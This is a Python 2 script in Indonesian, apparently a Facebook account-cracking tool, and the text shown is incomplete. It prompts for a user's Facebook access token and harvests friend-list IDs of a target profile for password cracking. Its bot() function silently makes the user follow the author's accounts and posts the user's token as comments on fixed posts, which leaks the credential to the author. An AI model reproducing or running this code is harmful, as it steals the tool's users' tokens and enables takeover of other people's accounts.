#!/usr/bin/python2
# coding=utf-8
# author : BINTANG-XD

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
id = []
cp = []
ok = []
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
\x1b[1;91m ___________          _____ _____________________
\x1b[1;92m \_   _____/         /     \\______   \_   _____/
\x1b[1;93m  |    __)  ______  /  \ /  \|    |  _/|    __)  
\x1b[1;94m  |     \  /_____/ /    Y    \    |   \|     \   
\x1b[1;95m  \___  /          \____|__  /______  /\___  /   
\x1b[1;96m      \/                   \/       \/     \/      """%(N))
   
### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print(" %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mNdriiTzy X EzaaTzy"%(N))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mGithub     \x1b[1;93m: \x1b[1;93mhttps://github.com/YumasaaTzy")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s"%(tgl))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;92mPremium Sampai Kiamat%s"%(H,N))
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mIP         \x1b[1;93m: %s"%(IP))
		token = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan token \x1b[1;93m: \x1b[1;92m')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print(" %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor    \x1b[1;93m: \x1b[1;93mNdriiTzy X EzaaTzy"%(N))
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mGithub    : https://github.com/YumasaaTzy")
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m--------------------------------------------")
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung \x1b[1;93m: %s"%(tgl))
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus    \x1b[1;93m: %s\x1b[1;92mPremium Sampai Kiamat%s"%(H,N))
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m--------------------------------------------")
    print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mIP        \x1b[1;93m: %s"%(IP))
    print("\n \x1b[1;92m[ \x1b[1;97mselamat datang %s%s%s \x1b[1;92m]\n"%(K,nama,N))
    print(" \x1b[1;92m[\x1b[1;93m01\x1b[1;92m]. \x1b[1;93mcrack dari id publik")
    asw = raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih menu : \x1b[1;92m")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    	atursandi()
    elif asw == "2":
    	massal()
    	atursandi()
    elif asw == "3":
    	followers()
    	atursandi()
    elif asw == "4":
    	postingan()
    	atursandi()
    elif asw == "5":
    	fbbaru()
        sandimanual()
    elif asw == "6":
    	fbtua()
        sandimanual()
    elif asw == "7":
    	emailfb()
        sandimanual()
    elif asw == "8":
    	infotambahan()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	jalan(" \x1b[1;92m[\x1b[1;93m✓\x1b[1;92m] \x1b[1;93mberhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih jawaban dengan bener ! ")
    	menu() 

### DUMP PUBLIK ###
def publik():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93misi \x1b[1;97m'\x1b[1;92mme\x1b[1;97m' \x1b[1;93mjika ingin crack dari daftar teman")
	idt = raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mmasukan id atau username \x1b[1;93m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
	print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;93m: %s%s%s\x1b[1;92m"%(M,len(id),N)) 
  
